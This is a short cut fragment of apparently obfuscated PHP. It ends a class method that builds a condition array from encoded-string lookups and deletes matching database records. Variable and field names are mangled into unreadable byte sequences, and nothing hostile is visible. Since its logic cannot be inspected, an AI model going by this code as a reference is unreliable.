array($Ä½ê§ºÚ[1077], 0), $Ä½ê§ºÚ[495] => $§€‚¢ö); return $this->where($”‰ø¦äğ)->delete(); } }